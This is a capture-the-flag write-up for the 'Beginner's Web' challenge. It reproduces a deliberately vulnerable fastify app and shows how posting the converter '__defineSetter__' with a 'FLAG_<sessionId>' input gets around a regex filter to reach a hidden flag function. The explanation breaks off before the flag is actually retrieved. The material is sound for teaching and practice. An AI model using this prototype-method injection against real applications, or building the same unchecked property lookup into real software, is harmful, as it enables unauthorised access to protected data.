# Beginner's Web
A simple web app with back end logic coded in JavaScript/fastify. \
The front end lets you enter a string which can be converted to base64 or scrypt
before output.

## Problem:
How can we output the flag variable which is stored
inside the JavaScript code that runs on the web app backend?

## Web app code shared for the challenge:

### app.js
```
const fastify = require('fastify');
const nunjucks = require('nunjucks');
const crypto = require('crypto');


const converters = {};

const flagConverter = (input, callback) => {
  const flag = '*** CENSORED ***';
  callback(null, flag);
};

const base64Converter = (input, callback) => {
  try {
    const result = Buffer.from(input).toString('base64');
    callback(null, result)
  } catch (error) {
    callback(error);
  }
};

const scryptConverter = (input, callback) => {
  crypto.scrypt(input, 'I like sugar', 64, (error, key) => {
    if (error) {
      callback(error);
    } else {
      callback(null, key.toString('hex'));
    }
  });
};


const app = fastify();
app.register(require('point-of-view'), {engine: {nunjucks}});
app.register(require('fastify-formbody'));
app.register(require('fastify-cookie'));
app.register(require('fastify-session'), {secret: Math.random().toString(2), cookie: {secure: false}});

app.get('/', async (request, reply) => {
  reply.view('index.html', {sessionId: request.session.sessionId});
});

app.post('/', async (request, reply) => {
  if (request.body.converter.match(/[FLAG]/)) {
    throw new Error("Don't be evil :)");
  }

  if (request.body.input.length < 20) {
    throw new Error('Too short :(');
  }

  if (request.body.input.length > 1000) {
    throw new Error('Too long :(');
  }

  converters['base64'] = base64Converter;
  converters['scrypt'] = scryptConverter;
  converters[`FLAG_${request.session.sessionId}`] = flagConverter;

  const result = await new Promise((resolve, reject) => {
    converters[request.body.converter](request.body.input, (error, result) => {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    });
  });

  reply.view('index.html', {
    input: request.body.input,
    result,
    sessionId: request.session.sessionId,
  });
});

app.setErrorHandler((error, request, reply) => {
  reply.view('index.html', {error, sessionId: request.session.sessionId});
});

app.listen(59101, '0.0.0.0');
```

### index.html
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/milligram/1.4.0/milligram.css">
    <title>Beginner's Web: OmniConverter</title>
    <style>
      body {
        text-align: center;
      }
      .row {
        justify-content: center;
        margin: 1rem 0 1.5rem;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>OmniConverter</h1>
      {% if error %}
        <h2>ERROR: {{error}}</h2>
      {% endif %}
      <form method="POST">
        <textarea name="input" minlength="20">{{input}}</textarea>
        <div class="row">
          <select class="column column-20" name="converter">
            <option value="base64">Base64</option>
            <option value="scrypt">scrypt</option>
          </select>
          <button class="column column-10" type="submit">Convert</button>
        </div>
        <textarea disabled>{{result}}</textarea>
      </form>
      <p>Session ID: {{sessionId}}</p>
    </div>
  </body>
</html>
```

## What data can be posted to the back end of this web app?
* input *(request.body.input)*
* converter *(request.body.converter)*

## Where is the flag stored?
The flag is stored within the flagConverter function:
```
const flagConverter = (input, callback) => {
  const flag = '*** CENSORED ***';
  callback(null, flag);
};
```

Every time we post new data to the web app, the flagConverter function gets
assigned to the *converters* object, \
with the key: *FLAG_${request.session.sessionId}*.\
Code:
``  converters[`FLAG_${request.session.sessionId}`] = flagConverter;``

## How is this web app vulnerable?
The *converters* object can be manipulated by our inputs, as shown in the code:
```
const result = await new Promise((resolve, reject) => {
  converters[request.body.converter](request.body.input, (error, result) => {
    if (error) {
      reject(error);
    } else {
      resolve(result);
    }
  });
});
```

## First thoughts on how to get the flag
If it was possible, we would give as input that the converter (request.body.converter)
is 'FLAG_${request.session.sessionId}', with request.body.input set to any
arbitrary string between 20 and 1000 characters (to avoid the web app throwing
an error, noting that the flagConverter function doesn't actually use the input).

Then the resulting code (depending on the sessionId, with example input
'zzzzzzzzzzzzzzzzzzzz') would be something like:
```
const result = await new Promise((resolve, reject) => {
  converters['FLAG_R3EJRIyxaosT3czNb-qxApiZuWbYTRQH']('zzzzzzzzzzzzzzzzzzzz', (error, result) => {
    if (error) {
      reject(error);
    } else {
      resolve(result);
    }
  });
});
```

Meaning, more specifically, we would call the flagConverter function in the
following way:
```
const result = await new Promise((resolve, reject) => {
  flagConverter('zzzzzzzzzzzzzzzzzzzz', (error, result) => {
    if (error) {
      reject(error);
    } else {
      resolve(result);
    }
  });
});
```

Provided the Promise fulfills, this would store the flag in the result constant,
which would subsequently be sent to the front end in the following code:

```
reply.view('index.html', {
  input: request.body.input,
  result,
  sessionId: request.session.sessionId,
});
```

However, since the converter variable can not match the /[FLAG]/ regex, we will be
unsuccessful if trying to set the converter (request.body.converter) to
\`FLAG_${request.session.sessionId}\`.

## An actual solution

### \_\_defineSetter\_\_
Use the [\_\_defineSetter\_\_](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__) method on the converters object to bind
"an object's property to a function to be called when an attempt is made to set
that property."

**Syntax:**\
`converters.__defineSetter__(property, function);`

Now, we can give the following inputs:
* converter: '\_\_defineSetter\_\_'
* input: 'FLAG_${request.session.sessionId}'

Thus, the resulting call, depending on the sessionId, will be something like:
```
const result = await new Promise((resolve, reject) => {
  converters['__defineSetter__']('FLAG_R3EJRIyxaosT3czNb-qxApiZuWbYTRQH', (error, result) => {
    if (error) {
      reject(error);
    } else {
      resolve(result);
    }
  });
});
```

To clarify, the setter function for converters['FLAG_R3EJRIyxaosT3czNb-qxApiZuWbYTRQH']
is now:
```
(error, result) => {
  if (error) {
    reject(error);
  } else {
    resolve(result);
  }
}
```

If we inspect the converters object before and after calling \_\_defineSetter\_\_
on the converters object, we will see that the value of
converters[FLAG_${request.session.sessionId}] changes:

Initial value:\
`FLAG_kO7GD6JtnAXSK2HnzZ8qkNxl6reWN_ml: [Function: flagConverter]`

Value after \_\_defineSetter\_\_:\
`FLAG_kO7GD6JtnAXSK2HnzZ8qkNxl6reWN_ml: [Setter]`

If we now make a final post request, the code will yet again attempt to assign
the converters[FLAG_${request.session.sessionId}] to the flagConverter function:
``converters[`FLAG_${request.session.sessionId}`] = flagConverter;``

However, since converters[\`FLAG_${request.session.sessionId}\`] is now
assigned to a setter method, the setter method will run with flagConverter as
the argument. Because the setter method is no longer wrapped in a promise,
an error will occur, as the reject method is no longer defined.
